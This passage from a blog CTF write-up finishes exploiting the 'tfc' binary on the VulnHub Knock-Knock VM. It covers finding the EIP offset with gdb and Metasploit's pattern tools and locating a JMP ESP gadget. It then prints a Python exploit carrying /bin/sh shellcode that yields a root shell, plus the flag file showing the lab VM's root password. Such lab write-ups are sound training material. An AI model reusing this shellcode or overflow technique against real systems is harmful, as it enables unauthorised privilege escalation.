<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; test.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# head test.tfc
</span><span class='line'>��<span class="o">[</span>�<span class="o">]</span>��C��dl�
</span><span class='line'>              H<span class="o">)</span>�Aotg�<span class="se">\!</span>�E?�̀l+�B��<span class="nv">$f5</span>%�<span class="p">&amp;</span>�y�<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R.�+T��w�<span class="nv">$͟</span>�7��?i�w<span class="err">&#39;</span>�3�s&lt;A��^��
</span><span class='line'>
</span><span class='line'>root@kali:~# ./tfc test.tfc out.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'>root@kali:~# head out.tfc
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></code></pre></td></tr></table></div></figure>


<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0xffffffc8
</span><span class='line'>EDX: 0x9 <span class="o">(</span><span class="s1">&#39;\t&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff3d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff3d8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff3dc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff3e0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff3e4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff3e8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xbffff3ec <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x35684634 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 4124
</span></code></pre></td></tr></table></div></figure>


<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;BBBB&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img src="https://i.imgur.com/Mqkfe8l.png"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;\x93\x8e\x04\x08&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># 08048e93  ; jmp esp</span>
</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68</span><span class="s">&quot;</span> <span class="o">+</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span><span class="mi">4124</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;C&quot;</span> <span class="o">*</span><span class="p">(</span><span class="mi">6000</span><span class="o">-</span><span class="mi">4124</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">encrypted</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>python make-crypt.py &gt; crash.tfc <span class="o">&amp;&amp;</span> ./tfc crash.tfc crash-out.tfc
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>pwnd!</p>

<p>As proof, the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</span>
</span><span class='line'> __                         __              __                         __      ____
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __         <span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ /_   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  ______ <span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;  /_____/ <span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span>        <span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="p">|</span>___<span class="p">|</span>
</span><span class='line'>     <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>              <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>Hooray you got the flag!
</span><span class='line'>
</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
</span><span class='line'>
</span><span class='line'>Feel free to hit me up in <span class="c">#vulnhub @ zer0w1re</span>
</span><span class='line'>
</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
</span><span class='line'>as well as rasta_mouse, and recrudesce <span class="k">for </span>helping to find bugs and <span class="nb">test </span>the VM :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root password is <span class="s2">&quot;qVx4UJ*zcUdc9#3C$Q&quot;</span>, but you should already have a shell, right? <span class="p">;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>

      








  


<time datetime="2014-10-14T09:14:26+02:00" pubdate data-updated="true">Oct 14<sup>th</sup>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/challenge/'>challenge</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/solution/'>solution</a>, <a class='category' href='/blog/categories/vulnerable-vm/'>vulnerable vm</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/" title="Previous Post: another troll tamed - solving troll 2">&laquo; another troll tamed - solving troll 2</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/11/09/solving-kvasir-netcat-edition/" title="Next Post: solving kvasir - netcat edition">solving kvasir - netcat edition &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <br>
  <p>
    <a href="https://leonjza.github.io/about/">Another caffeine fueled security guy.</a>
 </p>
</section>
<section>
 <p>
    <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="https://i.imgur.com/Ew3ZXtn.png"></a>
 </p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/05/09/playing-exploit-exercises-nebula/">playing exploit-exercises - nebula</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/">beating sokar - the vulnhub turns 0b10 challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/">a trivial iOS jailbreak detection bypass</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/">no more jailbreak detection - an adventure into Android app reversing and smali patching</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/23/hoof-to-root-solving-pegasus-1/">hoof to root ? - solving pegasus 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">playing in the playground - a offsec virtual pentesting labs review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/trying-harder-oscp-and-me/">trying harder - oscp and me</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/09/solving-kvasir-netcat-edition/">solving kvasir - netcat edition</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
